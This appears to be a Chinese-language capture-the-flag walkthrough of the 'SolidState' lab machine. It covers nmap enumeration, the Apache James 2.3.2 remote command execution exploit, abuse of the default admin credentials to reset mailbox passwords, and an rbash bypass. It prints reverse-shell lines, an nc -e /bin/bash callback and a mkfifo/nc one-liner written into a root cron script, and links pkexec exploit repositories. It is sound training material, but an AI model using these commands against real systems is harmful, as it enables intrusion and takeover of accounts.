## nmap

```Bash
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip

```



```Bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey:
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.16.11 [10.10.16.11])
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp  open  pop3    JAMES pop3d 2.3.2
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
119/tcp  open  nntp    JAMES nntpd (posting ok)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
4555/tcp open  rsip?
| fingerprint-strings:
|   GenericLines:
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for
|_    Login id:

```



## ssh

只有目录遍历相关，跳过



## mail

25 110 119

### JAMES 4555

```Bash
└─# searchsploit james | grep 2.3.2
Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (Metasploit)                          | linux/remote/48130.rb
Apache James Server 2.3.2 - Remote Command Execution                                                          | linux/remote/35513.py
Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)                                | linux/remote/50347.py

```

```Bash
└─# python2 35513.py 10.10.10.51
[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in.

```

exp攻击过程

- 在4555端口服务中新建了一个名为  ../../../../../../../../etc/bash_completion.d 的用户，密码未exploit
- 给改用户发送一封邮件，邮件中包含一个反弹shell
- 需要登录后触发邮件反弹shell



使用nc验证下上面个的攻击过程

```Bash
└─# nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:  #从脚本中可以看到这里使用默认账号 root/root
root
Password:
root
Welcome root. HELP for a list of commands
HELP # 使用help查看可用命令
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
listusers # 查看所有用户，存在py脚本中新建的用户，剩下的用户可能是系统用户信息
Existing accounts 6
user: james
user: ../../../../../../../../etc/bash_completion.d
user: thomas
user: john
user: mindy
user: mailadmin

```

使用setpassword 修改下其余所有用户的登录密码james thomas john mindy mailadmin

```Bash
setpassword thomas oscp
Password for thomas reset
setpassword john oscp
Password for john reset
setpassword mindy oscp
Password for mindy reset
setpassword mailadmin oscp
Password for mailadmin reset

```



### SMTP和  POP3 

尝试使用上面的用户登录25和110端口

多次尝试后 所有端口竟然关闭了，靶机reset后正常了，不知道是不是靶场bug

```Bash
# james给john发送了邮件，要求他给mindy发送一个登录用的临时密码
└─# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
USER john
+OK
PASS john
+OK Welcome john
list
+OK 1 743
1 743
.
1
-ERR
retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John,

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory pa                                                                                                                                                                  ssword to login to her accounts.

Thank you in advance.

Respectfully,
James


```



```Bash
# mindy收到邮件，给了一个账号密码
username: mindy
pass: P@55W0rd1!2@

```



```Bash
#exp生成的账号及邮件中的poc
┌──(root㉿walle)-[/home/machines/linux/solidsate]
└─# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
USER ../../../../../../../../etc/bash_completion.d
+OK
PASS exploit
+OK Welcome ../../../../../../../../etc/bash_completion.d
lsit\
-ERR
list
+OK 1 594
1 594
.
retr 1
+OK Message follows
Return-Path: <'@team.pl>
Message-ID: <9152149.0.1673097694316.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost
Received: from 10.10.16.11 ([10.10.16.11])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 597
          for <../../../../../../../../etc/bash_completion.d@localhost>;
          Sat, 7 Jan 2023 08:20:54 -0500 (EST)
Date: Sat, 7 Jan 2023 08:20:54 -0500 (EST)
From: team@team.pl

'
nc -e /bin/bash 10.10.16.11 7777


```

使用mindy的ssh账号登录，会触发邮件中的反弹shell，拿到的是一个不正常的shell，这里有两个思路解

- 使用netcat magic方法解决，简单粗暴有效
- 查看/etc/passwd会发现mindy 是一个 rbash

```Bash
mindy:x:1001:1001:mindy:/home/mindy:/bin/rbash

```

直接在ssh的时候指定bash规避掉，非常优雅的拿到一个完美的shell

```Bash
┌──(root㉿walle)-[/home/machines/linux/solidsate]
└─# ssh mindy@10.10.10.51 -t "bash"
mindy@10.10.10.51's password:
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$

```





## http - rabbit hole

看页面没有什么特别的

目录爆破，都是静态资源，没有什么特别的



## privilege escalation

```Bash
# 在opt下面找到一个777的脚本，root用户，但是没有发现定时执行的调用者
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -la
total 16
drwxr-xr-x  3 root root 4096 Aug 22  2017 .
drwxr-xr-x 22 root root 4096 May 27  2022 ..
drwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2
-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()

```

先把py脚本内容改成反弹shell

```Bash
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.11 7788 >/tmp/f')
except:
     sys.exit()

```

什么也没有做，过了一会发现拿到了root shell... , 用pspy32看下是谁在调脚本

发现有cron在执行

![](https://secure2.wostatic.cn/static/9B4JhfH4KWsvxefmeDaJAQ/image.png?auth_key=1677500406-fjDsbUtLWyGj7ukwhZMX7T-0-361767a2aee518eb61688f31bb1d5cf8)

root的cron表，但是为什么这个cron在脚本中都没有发现？

![](https://secure2.wostatic.cn/static/bChY9ty6CtkDC1eQSsP4yf/image.png?auth_key=1677500406-hbffsHoLVC4nJyu13LM377-0-ef3df04a83e59a20e87cf1f126622d3b)

## Beyond root

james的漏洞是怎么回是，为什么需要用一个用户登录来触发邮件中的反弹shell

[https://www.wolai.com/9h98ypAUZT2ZsZXsTGPczf](https://www.wolai.com/9h98ypAUZT2ZsZXsTGPczf)



### SUID

- 还有种思路是改变tmp.py的SUID强制文件以root执行，不需要等cron定时

```Bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -lh
total 8.0K
drwxr-xr-x 11 root root 4.0K Apr 26  2021 james-2.3.2
-rwxrwxrwx  1 root root  130 Jan  7 09:35 tmp.py
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ chmod -u=s tmp.py
chmod: changing permissions of 'tmp.py': Operation not permitted
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ chmod u+s  tmp.py
chmod: changing permissions of 'tmp.py': Operation not permitted
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$

```

实际操作中发现并不可行



- 这个题之前有个提权方式是通过dash的suid提权，这次发现竟然被修复了，是不是考虑到这种提权方式过于简单粗暴

![](https://secure2.wostatic.cn/static/eRD8t3HxPTDL3Z17M4pbVX/image.png?auth_key=1677500406-thDXp9iDgUPEJPhJFAEstg-0-2f2eb2d2a4f375f36b083f81dc244ad8)



### pkexec提权

python版的poc，不算特别好用

[GitHub - dadvlingd/-CVE-2021-4034](https://github.com/dadvlingd/-CVE-2021-4034)



最多star 需要靶机可以make

[GitHub - berdav/CVE-2021-4034: CVE-2021-4034 1day](https://github.com/berdav/CVE-2021-4034)

